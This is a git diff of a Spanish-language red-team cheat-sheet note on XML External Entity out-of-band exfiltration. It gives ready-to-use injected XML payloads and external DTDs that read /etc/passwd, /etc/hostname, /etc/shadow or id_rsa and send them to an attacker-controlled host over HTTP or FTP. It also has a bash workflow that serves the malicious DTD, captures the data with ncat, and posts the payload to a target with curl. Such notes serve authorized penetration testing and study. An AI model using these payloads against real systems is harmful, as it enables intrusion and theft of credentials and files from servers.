@@ -1,21 +1,21 @@
 ---
 aliases:
-  - "XXE Out-of-Band (OOB)"
-  - "XXE OOB"
+  - XXE Out-of-Band (OOB)
+  - XXE OOB
 tags:
   - type/technique
   - vuln/xxe
   - technique/execution
   - asset/web-app
 primary categories:
-  - "[[Red Team]]"
+  - '[[Red Team]]'
 secondary categories:
-  - "[[Explotación]]"
+  - '[[Explotación]]'
 tertiary categories:
-  - "[[Web Explotación]]"
+  - '[[Web Explotación]]'
 kind: SubCheatSheet
 linked:
-  - "[[XML External Entity (XXE)]]"
+  - '[[XML External Entity (XXE)]]'
 ---
 # XXE - Out-of-Band (OOB) y DTDs Externos
 
@@ -23,38 +23,73 @@ linked:
 
 ## Cheatsheet
 
-| **Objetivo Estratégico**                           | **Descripción de la Técnica**                                                                                                                                                                                      | **Estructura del Payload y DTD**                                                                                                                                                                                                                                                                                      |
-| -------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| **Exfiltración de Datos vía HTTP (GET)**           | Extraigo el contenido concatenándolo como un parámetro de consulta (`?data=`) en una petición HTTP dirigida a mi servidor de captura de logs.                                                                      | **XML Inyectado:**<br>`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://mi-servidor.com/malicioso.dtd"> %xxe;]><foo/>`<br><br>**malicioso.dtd:**<br>`<!ENTITY % file SYSTEM "file:///etc/hostname">`<br>`<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://mi-servidor.com/?data=%file;'>">`<br>`%eval;`<br>`%exfil;` |
-| **Exfiltración vía FTP o protocolos alternativos** | Cuando el tráfico HTTP saliente está filtrado o inspeccionado, intento extraer los datos forzando al parser (comúnmente en Java) a utilizar otros esquemas URI soportados, como FTP.                               | **malicioso.dtd (Variante FTP):**<br>`<!ENTITY % file SYSTEM "file:///etc/hostname">`<br>`<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://mi-servidor.com/%file;'>">`<br>`%eval;`<br>`%exfil;`                                                                                                                   |
-| **Detección Ciega vía DNS (Interacción OOB)**      | Si no busco extraer un archivo sino únicamente confirmar la existencia de la vulnerabilidad de resolución de entidades, provoco una simple búsqueda DNS hacia un dominio bajo mi control (como Burp Collaborator). | **XML Inyectado (Sin DTD Externo):**<br>`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://subdominio-unico.mi-servidor.com/test"> %xxe;]><foo/>`                                                                                                                                                                          |
-
+| **Payload** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/exfil.dtd"> %xxe;]><foo/>` (+ DTD HTTP exfil) | Archivo target via GET `?data=<contenido>` a tu servidor | Egress HTTP saliente permitido. |
+| Mismo payload con DTD que use `convert.base64-encode` | Archivos multilínea o binarios en base64 | Target con `\n` (`/etc/shadow`, `id_rsa`) o XML-rompedores. |
+| `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/ftp.dtd"> %xxe;]><foo/>` (+ DTD FTP) | Archivo via conexión `ftp://` | HTTP egress bloqueado, FTP permitido (común en Java). |
+| `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://CANARY.oast.fun/probe"> %xxe;]><foo/>` | Callback DNS + HTTP en Collaborator | Detección blind sin necesidad de exfil. |
+| `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "ftp://CANARY.oast.fun/probe"> %xxe;]><foo/>` | Callback FTP | Verificación de schema soportado por el parser. |
 ^xxe-oob
 
-## Consideraciones Críticas y Restricciones
+### DTD externo HTTP exfil (`exfil.dtd`)
 
-- **Limitaciones por Caracteres de Nueva Línea:** Extraer archivos multilínea (como `/etc/passwd` o claves RSA) a través de URLs (HTTP GET) suele fallar porque los caracteres de salto de línea rompen la sintaxis de la petición HTTP en muchos parsers modernos.
-- **Uso de Wrappers para Evasión:** Para solucionar la ruptura por saltos de línea o caracteres especiales en aplicaciones PHP, modifico la entidad que lee el archivo para utilizar el filtro Base64: `<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">`. Esto garantiza que los datos viajen de forma segura a través de la URL. En Java o .NET, las opciones son más limitadas y a menudo requieren exfiltración basada en FTP o la redefinición de DTDs locales.
-- **Firewalls de Salida (Egress Filtering):** El éxito absoluto de esta técnica recae en que el servidor víctima tenga permitido iniciar conexiones hacia Internet (o hacia el segmento de red donde controlo el servidor de captura). Si el entorno aplica políticas de _Deny All_ saliente, el ataque OOB fallará y deberé pivotar hacia la exfiltración basada en errores usando DTDs locales.
+```xml
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/log?data=%file;'>">
+%eval;
+%exfil;
+```
 
+### DTD externo FTP exfil (`ftp.dtd`)
 
-***
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://ATTACKER/%file;'>">
+%eval;
+%exfil;
+```
+
+### Workflow rápido
+
+```bash
+# 1. Servir DTD malicioso
+python3 -m http.server 8000  # exfil.dtd en cwd
+
+# 2. Log de exfil — capturar parámetro 'data'
+ncat -lkvp 8000 2>&1 | tee xxe.log
+# o nginx access log con $arg_data
+
+# 3. Enviar payload
+curl -X POST https://target/api -H 'Content-Type: application/xml' --data \
+  '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR_IP:8000/exfil.dtd"> %xxe;]><foo/>'
+
+# 4. Detección blind con Collaborator (sin exfil)
+curl -X POST https://target/api -H 'Content-Type: application/xml' --data \
+  '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://CANARY.oast.fun/xxe-probe"> %xxe;]><foo/>'
+# Verificar pollers en Collaborator → DNS + HTTP hit confirma resolución de entities
+
+# 5. FTP exfil cuando HTTP bloqueado (Java targets)
+ftpserver.py -p 21  # ej: github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb
+```
+
+___
 
 ## Overview
 
+OOB se usa cuando hay **vulnerabilidad confirmada pero la app no refleja ni emite errores verbose**. El parser descarga un DTD externo, lee el archivo target, lo concatena como query/path de una URL hacia el atacante → contenido aparece en logs del servidor controlado.
 
-La exfiltración Out-of-Band (OOB) es la técnica táctica fundamental cuando me enfrento a una vulnerabilidad de [[Blind XXE]] donde la aplicación procesa el XML pero no refleja el contenido en la respuesta HTTP ni arroja errores detallados. Para lograr la extracción de datos, recurro a entidades de parámetros (`%`) y la carga de un DTD externo para forzar al servidor a enviar el contenido del archivo objetivo hacia una infraestructura bajo mi control mediante peticiones de red (HTTP, FTP o DNS).
+### Mecanismo
 
-### Mecanismo de Acción
+1. **Payload inicial** carga DTD remoto vía `<!ENTITY % xxe SYSTEM "http://ATTACKER/...">`.
+2. **DTD externo** define entidades anidadas — el subset interno prohíbe entity-defining-entity, pero el externo lo permite.
+3. **Entidad `%exfil`** se construye dinámicamente con el contenido del archivo como parte de la URL.
+4. Parser hace la request al atacante → contenido queda en logs.
 
-El estándar XML prohíbe el uso de entidades de parámetros para definir dinámicamente otras entidades dentro del subconjunto DTD interno (el preámbulo que envío en mi petición). Para evadir esta restricción, la estrategia requiere dos componentes:
-1. **Payload Inyectado:** Un bloque XML inicial que instruye al parser a conectarse a mi servidor y descargar un archivo DTD externo.
-2. **DTD Externo:** Un archivo alojado en mi infraestructura que contiene la lógica de encadenamiento. Este DTD lee el archivo local del servidor víctima y define dinámicamente una nueva entidad que adjunta el contenido leído como un parámetro en una solicitud saliente.
+### Limitaciones
 
-
-***
-
-## Notas Relacionadas
-
+- **Egress filtering:** servidores cloud con _deny-all_ outbound → pivotar a [[XXE - DTDs Locales]] o [[XXE - Blind Basado en Errores]].
+- **Saltos de línea:** archivos multilínea rompen URL HTTP en parsers modernos → wrapper `php://filter/read=convert.base64-encode/resource=` (PHP) o FTP exfil (Java/.NET).
+- **Esquemas:** `http`/`https` universal; `ftp` en Java; `gopher` raramente.
 
 ***
